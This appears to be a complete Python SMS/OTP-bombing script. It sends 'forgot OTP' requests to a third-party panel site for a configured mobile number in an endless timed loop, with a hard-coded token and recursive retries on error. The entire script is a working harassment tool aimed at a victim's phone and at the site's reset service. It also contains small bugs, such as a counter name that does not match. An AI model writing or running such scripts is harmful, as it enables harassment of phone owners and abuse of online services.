import time
import requests
import config


def send_request():
    global config
    url = "https://88panel.com/forgot_otp/winbuzz.com"
    data = {"mobile": config.MOBILE_NUMBER, "_token": "OGcZZi42toVjDhacbWy7N2BBizJ6rd1hG2dNZgOO"}
    response = requests.post(url, data=data)
    if response.status_code == 200:
        config.NO_OTP += 1
        print(config.no_otp, "Request sent with status code:", response.status_code)
    else:
        print("Error Occurred...!!!:", response.status_code)
        send_request()

send_request()

while True:
    time.sleep(config.TIME_S)
    send_request()
